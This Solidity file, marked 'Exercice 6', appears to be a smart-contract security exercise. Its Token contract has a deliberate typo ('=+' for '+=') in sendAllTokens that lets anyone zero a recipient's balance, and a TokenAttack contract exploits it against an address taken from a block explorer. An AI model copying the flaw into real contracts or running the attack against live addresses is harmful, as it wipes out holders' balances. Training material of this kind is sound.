pragma solidity ^0.4.24;
//*** Exercice 6 ***//
contract Token {
    mapping(address => uint) public balances;

    /// @dev Buy token at the price of 1ETH/token.
    function buyToken() payable {
        balances[msg.sender]+=msg.value / 1 ether;
    }

    /** @dev Send token.
     *  @param _recipient The recipient.
     *  @param _amount The amount to send.
     */
    function sendToken(address _recipient, uint _amount) {
        require(balances[msg.sender]>=_amount); // You must have some tokens.

        balances[msg.sender]-=_amount;
        balances[_recipient]+=_amount;
    }

    /** @dev Send all tokens.
     *  @param _recipient The recipient.
     */
    function sendAllTokens(address _recipient) {
        balances[_recipient]=+balances[msg.sender];
        balances[msg.sender]=0;
    }

}

contract TokenAttack {
  Token victim;

  constructor(address _victim) public {
      victim = Token(_victim);
  }

  //typo in sendAllTokens (=+ instead of +=). attacker can set the owner's balance to 0 wei
  //get the owner's address from a block explorer or input an addr with a balance on the victim
  function attack(address _recipient) external returns(bool success) {
        // doesn't check if msg.sender has a balance either
        victim.sendAllTokens(_recipient);
        //the recipient's balance is now zero
        return true;
  }
}
